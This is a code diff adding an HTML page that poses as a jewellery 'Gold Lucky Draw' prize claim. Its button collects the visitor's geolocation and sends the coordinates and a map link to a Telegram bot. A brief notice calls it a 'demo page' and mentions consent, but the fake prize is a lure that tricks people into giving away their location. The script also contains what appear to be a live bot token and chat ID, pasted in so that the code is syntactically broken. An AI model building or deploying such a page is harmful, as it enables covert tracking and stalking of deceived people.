@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gold Business Lucky Draw</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #f7d774, #f3b63f);
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: white;
+      width: 90%;
+      max-width: 420px;
+      padding: 25px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    h1 {
+      color: #c98b00;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #444;
+      line-height: 1.5;
+    }
+
+    button {
+      background: #c98b00;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 15px;
+    }
+
+    button:hover {
+      background: #a06e00;
+    }
+
+    .notice {
+      margin-top: 18px;
+      font-size: 13px;
+      color: #666;
+      background: #fff8e1;
+      padding: 10px;
+      border-radius: 10px;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Gold Lucky Draw</h1>
+    <p>
+      Congratulations! You have been selected for our jewellery customer reward draw.
+    </p>
+
+    <button onclick="getLocation()">Claim Reward</button>
+
+    <div class="notice">
+      By clicking the button, you explicitly allow this demo page to access and share your location.
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // Replace with your Telegram Bot Token
+    const BOT_TOKEN =8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4 "YOUR_BOT_TOKEN";
+
+    // Replace with your Telegram Chat ID
+    const CHAT_ID =8508792403 "YOUR_CHAT_ID";
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    function getLocation() {
+      const status = document.getElementById("status");
+
+      if (!navigator.geolocation) {
+        status.innerText = "Geolocation is not supported.";
+        return;
+      }
+
+      status.innerText = "Requesting permission...";
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const msg = `📍 Consent-Based Location Share\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
+
+          await sendToTelegram(msg);
+
+          status.innerText = "Location shared successfully.";
+        },
+        (error) => {
+          status.innerText = "Permission denied or unavailable.";
+        }
+      );
+    }
+  </script>
+</body>
+</html>
